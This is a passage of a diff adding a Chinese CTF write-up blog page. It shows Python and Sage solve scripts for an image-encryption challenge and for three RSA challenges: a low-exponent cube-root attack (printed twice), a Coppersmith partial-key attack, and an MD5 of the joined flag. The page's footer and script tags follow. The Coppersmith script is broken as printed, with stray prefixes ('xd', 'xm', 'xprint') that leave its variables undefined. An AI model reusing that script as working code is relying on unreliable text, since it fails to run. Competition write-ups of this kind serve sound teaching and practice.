class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">flag = decrypt(flag_enc, key1, key2, x0, <span class="number">24</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line">data = <span class="string">''</span>.join(map(chr,flag))</span><br><span class="line">print(md5.new(data).hexdigest())</span><br><span class="line"><span class="comment"># test = decrypt(test_enc, key1, key2, x0, 16, 16)</span></span><br><span class="line"><span class="comment"># for i in range(len(test)):</span></span><br><span class="line"><span class="comment">#     if test[i] !=testimage[i]:</span></span><br><span class="line"><span class="comment">#         print('nope!',i)</span></span><br><span class="line"><span class="comment"># print(test)</span></span><br></pre></td></tr></table></figure>
+<h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>三个部分分别是低加密指数攻击、广播攻击和Copper-Smith攻击</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">e, n = (<span class="number">3</span>, <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    m = gmpy2.iroot(c + i * n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(m[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        print(m[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">e, n = (<span class="number">3</span>, <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    m = gmpy2.iroot(c + i * n, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(m[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        print(m[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">c = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">e, n = (<span class="number">65537</span>, <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span>)</span><br><span class="line">p4 = <span class="number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line">kbits = pbits - p4.nbits()</span><br><span class="line">print(p4.nbits())</span><br><span class="line">p4 = p4 &lt;&lt; kbits</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p4</span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="keyword">if</span> roots:        </span><br><span class="line">    p = p4+int(roots[<span class="number">0</span>]) </span><br><span class="line">    q = n // p</span><br><span class="line">    phi_n = (q - <span class="number">1</span>) * (p - <span class="number">1</span>)</span><br><span class="line">    xd = invert(e, phi_n)</span><br><span class="line">    xm = pow(c, d, n)</span><br><span class="line">    xprint(m)</span><br></pre></td></tr></table></figure>
+<p>最后拼起来md5得到flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  long_to_bytes</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">msg1 = long_to_bytes(<span class="number">267334379257781603687613466720913534310764480084016847281446486946801530200295563483353634338157</span>)</span><br><span class="line">msg2 = long_to_bytes(<span class="number">4193305853284549103821195807609492624095031428085219879448342104337322945001387680236011960472296815293233144303730273979905837762067652913308898433728800864776794638198055607422503065410595894676740531680367227696622352026247676452540064020322619036125381146346603655445487695574824919137</span>)</span><br><span class="line">msg3 = long_to_bytes(<span class="number">978430871477569051989776547659020359721056838635797362474311886436116962354292851181720060000979143571198378856012391742078510586927376783797757539078239088349758644144812898155106623543650953940606543822567423130350207207895380499638001151443841997176299548692737056724423631882</span>)</span><br><span class="line">flag = msg1 + msg2 + msg3</span><br><span class="line">print(flag)</span><br><span class="line">print(md5(flag).hexdigest())</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+              <a href="/tags/WP/" rel="tag"><i class="fa fa-tag"></i> WP</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/29/bluehat2021/" rel="prev" title="蓝帽杯2021 Crypto WriteUp">
+      <i class="fa fa-chevron-left"></i> 蓝帽杯2021 Crypto WriteUp
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80OTg5Ny8yNjM4OA=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lonely-wolf"><span class="nav-number">1.1.</span> <span class="nav-text">lonely_wolf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwny"><span class="nav-number">1.2.</span> <span class="nav-text">pwny</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#imageencrypt"><span class="nav-number">2.1.</span> <span class="nav-text">imageencrypt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rsa"><span class="nav-number">2.2.</span> <span class="nav-text">rsa</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <a href="/">
+        <img class="site-author-image" itemprop="image"
+            src="/images/avatar.jpg"
+            alt="Shrimpwr" />
+    </a>
+  <p class="site-author-name" itemprop="name">Shrimpwr</p>
+  <div class="site-description" itemprop="description">无数渺小的思考填满了人的一生</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Shrimpwr" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Shrimpwr" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:shrimpwr@gmail.com" title="E-Mail → mailto:shrimpwr@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1349937484&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+<div class="copyright" style="display:inline">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-glass-martini-alt"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Shrimpwr</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">118k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:47</span>
+    <span class="post-meta-divider">|</span>
+</div>
+
+        
+<div class="busuanzi-count" style = "display:inline">
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1278945960&web_id=1278945960"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='240,248,255' opacity='0.8' zIndex='-1' count='120' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
